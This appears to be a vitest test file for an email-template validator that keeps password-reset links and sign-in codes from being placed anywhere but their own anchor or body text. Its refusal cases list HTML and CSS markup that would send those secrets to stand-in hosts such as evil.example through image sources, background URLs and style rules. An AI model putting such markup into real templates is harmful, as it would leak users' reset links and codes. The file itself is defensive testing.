import { describe, expect, it } from 'vitest'
import { externalHosts, unsafeEmailHtml } from './safeHtml'
import { builtinScenario, isSecurityScenario } from './scenarios'
import { validateTemplate } from './validate'

const wrap = (inner: string) => `<html><body>${inner}</body></html>`

describe('secret placeholders in markup (O2)', () => {
  it('allows the link only as the href of its own anchor, and the code only as text', () => {
    expect(unsafeEmailHtml(wrap('<a href="{{link}}" style="x">Go</a><p>Your code: {{code}}</p>'))).toBeNull()
    expect(unsafeEmailHtml(wrap('<a href=\'{{ link }}\'>Go</a>'))).toBeNull()
  })

  it.each([
    '<img src="https://evil.example/{{link}}">',
    '<img src="https://evil.example/p.png?c={{code}}" />',
    '<a href="https://evil.example/?u={{link}}">x</a>',
    '<a href="https://evil.example/{{code}}">x</a>',
    '<a href="{{link}}x">x</a>',
    '<a href="{{link}}" title="{{link}}">x</a>',
    '<a title=">" href="https://evil.example/{{link}}">x</a>',
    '<a data-x="{{code}}" href="{{link}}">x</a>',
    '<div style="background:url(https://e.example/{{link}})">x</div>',
    '<table background="https://e.example/{{link}}"><tr><td>x</td></tr></table>',
    '<!--[if mso]><img src="https://e.example/{{link}}"><![endif]-->',
    '<style>.a{background:url(https://e.example/{{code}})}</style>',
    '<meta content="{{link}}">',
  ])('refuses %s', (inner) => {
    expect(unsafeEmailHtml(wrap(inner))).toMatch(/placeholder|{{/i)
  })

  it('is part of template validation', () => {
    const s = builtinScenario('password_reset')!
    const issues = validateTemplate(s, { subject: 'Reset', preheader: 'x', html: wrap('<img src="https://e.example/{{link}}">{{link}}') })
    expect(issues.some((i) => i.level === 'error')).toBe(true)
  })
})

describe('isSecurityScenario', () => {
  it('covers the scenarios that carry a link or a code', () => {
    for (const k of ['confirm_signup', 'sign_in_code', 'password_reset', 'email_change', 'reauthentication', 'invite_admin', 'admin_unlock_code', 'invite_user']) expect(isSecurityScenario(k)).toBe(true)
    for (const k of ['welcome', 'password_changed', 'email_changed', 'my_custom']) expect(isSecurityScenario(k)).toBe(false)
  })
})

describe('externalHosts', () => {
  it('lists distinct hosts', () => {
    expect(externalHosts('<a href="https://B.example/x">a</a><img src="http://a.example/p.png"><a href="https://b.example/y">')).toEqual(['a.example', 'b.example'])
  })
})
